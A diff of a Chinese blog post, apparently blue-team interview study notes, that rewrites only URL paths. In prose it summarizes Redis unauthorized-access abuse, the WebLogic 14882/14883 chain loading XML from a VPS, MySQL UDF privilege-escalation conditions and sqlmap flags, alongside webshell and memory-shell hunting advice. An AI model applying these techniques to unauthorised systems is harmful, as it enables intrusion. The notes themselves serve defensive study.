+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144346894.png" alt="image-20220613144346894"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144353800.png" alt="image-20220613144353800"></p>
+<h1 id="Redis未授权-6379"><a href="#Redis未授权-6379" class="headerlink" title="Redis未授权  6379"></a>Redis未授权  6379</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002422083.png" alt="image-20220616002422083"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615195653696.png" alt="image-20220615195653696"></p>
 <p>大概就是写文件进去，开机自启动，定时任务，以及写入ssh公钥</p>
-<p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615200123174.png" alt="image-20220615200123174"></p>
-<h1 id="勒索病毒怎么处理"><a href="#勒索病毒怎么处理" class="headerlink" title="勒索病毒怎么处理"></a>勒索病毒怎么处理</h1><p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204218916.png" alt="image-20220615204218916"></p>
-<h1 id="命令执行代码执行常见函数"><a href="#命令执行代码执行常见函数" class="headerlink" title="命令执行代码执行常见函数"></a>命令执行代码执行常见函数</h1><p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204425176.png" alt="image-20220615204425176"></p>
-<h1 id="一些安全加固"><a href="#一些安全加固" class="headerlink" title="一些安全加固"></a>一些安全加固</h1><p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204615956.png" alt="image-20220615204615956"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615200123174.png" alt="image-20220615200123174"></p>
+<h1 id="勒索病毒怎么处理"><a href="#勒索病毒怎么处理" class="headerlink" title="勒索病毒怎么处理"></a>勒索病毒怎么处理</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204218916.png" alt="image-20220615204218916"></p>
+<h1 id="命令执行代码执行常见函数"><a href="#命令执行代码执行常见函数" class="headerlink" title="命令执行代码执行常见函数"></a>命令执行代码执行常见函数</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204425176.png" alt="image-20220615204425176"></p>
+<h1 id="一些安全加固"><a href="#一些安全加固" class="headerlink" title="一些安全加固"></a>一些安全加固</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204615956.png" alt="image-20220615204615956"></p>
 <h1 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h1><p>14882+14883组合拳，14882做一个未授权访问，登到控制台，然后通过14883命令执行，写一个xml文件把命令写进去，让它去访问你的vps然后加载xml。</p>
 <p>xml的反序列化漏洞，通过xmldecoder还是什么导致的xml解析代码执行。弱口令。</p>
 <p>流量特征:不加密，常见的出网协议也可以用。有很多T3协议的特征，文件操作和冰蝎一样有fileoutstream字段。</p>
-<h1 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h1><p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002440960.png" alt="image-20220616002440960"></p>
-<h1 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h1><p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002454227.png" alt="image-20220616002454227"></p>
-<h1 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h1><p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220920190833089.png" alt="image-20220920190833089"></p>
+<h1 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002440960.png" alt="image-20220616002440960"></p>
+<h1 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002454227.png" alt="image-20220616002454227"></p>
+<h1 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220920190833089.png" alt="image-20220920190833089"></p>
 <p>**UDF (user defined function)**，即用户自定义函数。是通过添加新函数，对MySQL的功能进行扩充，其实就像使用本地MySQL函数如 user() 或 concat() 等。</p>
 <p>在 udf.dll 文件中刻字机定义函数，然后5,1以下导入到<code> c:\windows</code>或者 <code>c:\windows\system32</code>下，5.1以上导入到<code>MySQL Server 5.xx\lib\plugin</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">udf利用条件</span><br><span class="line">（1）MySQL数据库没有开启安全模式。</span><br><span class="line">（2）已知的数据库账号具有对MySQL数据库insert和delete的权限，最好是root最高权限。</span><br><span class="line">（3）shell有写入到数据库安装目录的权限。</span><br><span class="line">（4）知道绝对路径</span><br></pre></td></tr></table></figure>
@@ -691,25 +691,25 @@
 <p>练习研判师傅通过流量检测系统确认存在，攻击行为</p>
 <p>应急与加固复责引导攻击进入蜜罐和修复漏洞，篡写报告</p>
 </blockquote>
-<h1 id="常见的框架漏洞"><a href="#常见的框架漏洞" class="headerlink" title="常见的框架漏洞"></a>常见的框架漏洞</h1><p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002859095.png" alt="image-20220616002859095"></p>
-<h1 id="spring的漏洞"><a href="#spring的漏洞" class="headerlink" title="spring的漏洞"></a>spring的漏洞</h1><p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103236191.png" alt="image-20220616103236191"></p>
-<p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103245713.png" alt="image-20220616103245713"></p>
-<p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103255437.png" alt="image-20220616103255437"></p>
-<p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103307691.png" alt="image-20220616103307691"></p>
-<p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103314706.png" alt="image-20220616103314706"></p>
-<h1 id="thinkphp框架漏洞"><a href="#thinkphp框架漏洞" class="headerlink" title="thinkphp框架漏洞"></a>thinkphp框架漏洞</h1><h2 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h2><p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103546015.png" alt="image-20220616103546015"></p>
-<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103559468.png" alt="image-20220616103559468"></p>
+<h1 id="常见的框架漏洞"><a href="#常见的框架漏洞" class="headerlink" title="常见的框架漏洞"></a>常见的框架漏洞</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002859095.png" alt="image-20220616002859095"></p>
+<h1 id="spring的漏洞"><a href="#spring的漏洞" class="headerlink" title="spring的漏洞"></a>spring的漏洞</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103236191.png" alt="image-20220616103236191"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103245713.png" alt="image-20220616103245713"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103255437.png" alt="image-20220616103255437"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103307691.png" alt="image-20220616103307691"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103314706.png" alt="image-20220616103314706"></p>
+<h1 id="thinkphp框架漏洞"><a href="#thinkphp框架漏洞" class="headerlink" title="thinkphp框架漏洞"></a>thinkphp框架漏洞</h1><h2 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h2><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103546015.png" alt="image-20220616103546015"></p>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103559468.png" alt="image-20220616103559468"></p>
 <h1 id="冰蝎内存马怎么查杀-以及其他"><a href="#冰蝎内存马怎么查杀-以及其他" class="headerlink" title="冰蝎内存马怎么查杀 以及其他"></a>冰蝎内存马怎么查杀 以及其他</h1><p>冰蝎内存马用的是jvm加载类字节码的能力，常规的工具很难检测查杀，github上已经有查杀冰鞋jvm内存马的工具。</p>
 <p>如果我们通过检测工具或者其他手段发现了一些内存webshell的痕迹，需要有一个排查的思路来进行跟踪分析，也是根据各类型的原理，列出一个排查思路。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">如果是jsp注入，日志中排查可疑jsp的访问请求。</span><br><span class="line"></span><br><span class="line">如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法</span><br><span class="line"></span><br><span class="line">根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。</span><br><span class="line"></span><br><span class="line">如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间。</span><br><span class="line"></span><br><span class="line">如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200</span><br></pre></td></tr></table></figure>
 
 <h1 id="webshell排查"><a href="#webshell排查" class="headerlink" title="webshell排查"></a>webshell排查</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.系统如果已经被植入后门，说明攻击者已经攻击成功，而且拿到权限，这时候日志信息可能提供不了帮助，首先要去考虑系统的账户是否安全，，又没口令爆破成功的痕迹，排查账号的密码是否已经不安全.</span><br><span class="line"></span><br><span class="line">(Linux)的话看计划任务,有没有定时反弹shell,还有就是进程是不是可疑在通信.发现可疑问题,就要样本分析. crontab -l</span><br><span class="line"></span><br><span class="line">(windows)的话就看启动项和进程.</span><br><span class="line"></span><br><span class="line">如果是web入侵,看日志web服务是不是安全?还原攻击的流程.</span><br></pre></td></tr></table></figure>
 
-<h1 id="反向代理的工具"><a href="#反向代理的工具" class="headerlink" title="反向代理的工具"></a>反向代理的工具</h1><p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616162629488.png" alt="image-20220616162629488"></p>
-<h1 id="数据库有哪些"><a href="#数据库有哪些" class="headerlink" title="数据库有哪些"></a>数据库有哪些</h1><p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616225637341.png" alt="image-20220616225637341"></p>
-<h1 id="php危险函数"><a href="#php危险函数" class="headerlink" title="php危险函数"></a>php危险函数</h1><p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616225652582.png" alt="image-20220616225652582"></p>
-<h1 id="黄金白银票据"><a href="#黄金白银票据" class="headerlink" title="黄金白银票据"></a>黄金白银票据</h1><p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220919142934218.png" alt="image-20220919142934218"></p>
-<h1 id="linux比较重要的目录"><a href="#linux比较重要的目录" class="headerlink" title="linux比较重要的目录"></a>linux比较重要的目录</h1><p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220920161729837.png" alt="image-20220920161729837"></p>
+<h1 id="反向代理的工具"><a href="#反向代理的工具" class="headerlink" title="反向代理的工具"></a>反向代理的工具</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616162629488.png" alt="image-20220616162629488"></p>
+<h1 id="数据库有哪些"><a href="#数据库有哪些" class="headerlink" title="数据库有哪些"></a>数据库有哪些</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616225637341.png" alt="image-20220616225637341"></p>
+<h1 id="php危险函数"><a href="#php危险函数" class="headerlink" title="php危险函数"></a>php危险函数</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616225652582.png" alt="image-20220616225652582"></p>
+<h1 id="黄金白银票据"><a href="#黄金白银票据" class="headerlink" title="黄金白银票据"></a>黄金白银票据</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220919142934218.png" alt="image-20220919142934218"></p>
+<h1 id="linux比较重要的目录"><a href="#linux比较重要的目录" class="headerlink" title="linux比较重要的目录"></a>linux比较重要的目录</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220920161729837.png" alt="image-20220920161729837"></p>
 <h1 id="sqlmap常用命令"><a href="#sqlmap常用命令" class="headerlink" title="sqlmap常用命令"></a>sqlmap常用命令</h1><p>参数：-u URL 、-v 输出日志、-r 读取文件 、–random-agent随机UA、–dbs获取所有数据库、–cookie指定cookie</p>
 <p>–level 2 指定测试范围 2可以测试cookie 、–data= 指定post请求参数 、–batch 默认设置</p>
 <p>–risk 3 设置威胁级别、–technique= 指定测试的注入类型、-g 代入google查询 -p 指定测试的参数</p>
@@ -815,11 +815,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/wan1/2022/07/09/CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="prev" title="CVE-2021-44228 Apache Log4j2 lookup feature JNDI injection     漏洞复现">
+    <a href="/2022/07/09/CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="prev" title="CVE-2021-44228 Apache Log4j2 lookup feature JNDI injection     漏洞复现">
       <i class="fa fa-chevron-left"></i> CVE-2021-44228 Apache Log4j2 lookup feature JNDI injection     漏洞复现
     </a></div>
       <div class="post-nav-item">
-    <a href="/wan1/2022/08/14/Linux-suid%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" rel="next" title="Linux suid提权漏洞">
+    <a href="/2022/08/14/Linux-suid%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" rel="next" title="Linux suid提权漏洞">
       Linux suid提权漏洞 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -887,14 +887,14 @@
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <img class="site-author-image" itemprop="image" alt="十三"
-      src="/wan1/images/avatar.gif">
+      src="/images/avatar.gif">
   <p class="site-author-name" itemprop="name">十三</p>
   <div class="site-description" itemprop="description">潜心学习，不骄不躁</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/wan1/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">172</span>
           <span class="site-state-item-name">日志</span>
@@ -955,48 +955,48 @@
   </div>
 
   
-  <script src="/wan1/lib/anime.min.js"></script>
-  <script src="/wan1/lib/velocity/velocity.min.js"></script>
-  <script src="/wan1/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/wan1/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/wan1/js/motion.js"></script>
-
-
-<script src="/wan1/js/schemes/pisces.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/wan1/js/next-boot.js"></script>
+<script src="/js/schemes/pisces.js"></script>
 
 
-
-
-  
-
-
-
-
-  
-<script src="/wan1/js/local-search.js"></script>
-
-
-
-
-
-
-
-
-
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
 
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
   
 
-<script src="/wan1/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tsumiki"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tsumiki"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
 <!-- 页面点击小红心 -->
 <script type="text/javascript" src="/js/src/clicklove.js"></script>
